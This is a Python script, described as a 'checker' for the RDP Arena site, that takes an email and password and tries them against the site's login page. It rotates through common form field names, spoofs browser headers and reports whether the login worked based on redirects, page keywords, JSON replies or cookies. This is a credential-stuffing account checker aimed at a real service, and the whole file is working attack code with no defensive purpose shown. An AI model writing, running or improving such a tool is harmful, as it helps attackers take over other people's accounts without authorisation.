"""
Checker for RDP Arena (www.rdparena.com) – Improved false‑positive prevention.
"""
import requests
from typing import Tuple

BASE_URL = "https://www.rdparena.com/"
LOGIN_URL = BASE_URL + "payments/login"
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": BASE_URL
    })

    try:
        # Try common field names
        payloads = [
            {"email": email, "password": password},
            {"username": email, "password": password},
            {"login": email, "password": password}
        ]

        for payload in payloads:
            response = session.post(
                LOGIN_URL,
                data=payload,
                timeout=TIMEOUT,
                allow_redirects=False
            )

            # --- Redirect = success ---
            if response.status_code in (301, 302):
                location = response.headers.get("Location", "")
                if any(word in location.lower() for word in ["dashboard", "account", "home", "panel"]):
                    return True, f"Login successful (redirect to {location})"
                else:
                    # Still a redirect – likely success
                    return True, f"Login successful (redirect to {location})"

            # --- 200 OK – inspect content ---
            if response.status_code == 200:
                html = response.text.lower()

                # 1. Check for explicit error messages
                error_keywords = ["invalid", "incorrect", "error", "failed", "wrong", "not found"]
                if any(keyword in html for keyword in error_keywords):
                    return False, "Login failed (error message found)"

                # 2. Check if the page contains a login form (failure)
                if 'action="login"' in html or 'action="/login"' in html or 'name="password"' in html:
                    return False, "Login failed (login form present)"

                # 3. Check for success indicators
                success_keywords = ["dashboard", "logout", "welcome back", "account overview"]
                if any(keyword in html for keyword in success_keywords):
                    return True, "Login successful (content marker)"

                # 4. Check for JSON response (if any)
                if response.headers.get('content-type', '').startswith('application/json'):
                    try:
                        data = response.json()
                        if data.get("status") in ("success", "ok") or data.get("success") is True:
                            return True, "Login successful (JSON)"
                        else:
                            return False, f"Login failed: {data.get('message', 'unknown')}"
                    except:
                        pass

                # 5. Fallback: if we have a session cookie after POST, might be success
                if session.cookies.get_dict():
                    return True, "Login successful (session cookie set)"

                # 6. No clear indicator – treat as failure to avoid false positives
                return False, "Login response ambiguous (treated as failure)"

            # --- Other status codes ---
            else:
                return False, f"HTTP {response.status_code}: {response.reason}"

        return False, "All login field variations failed"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error – check network or URL"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"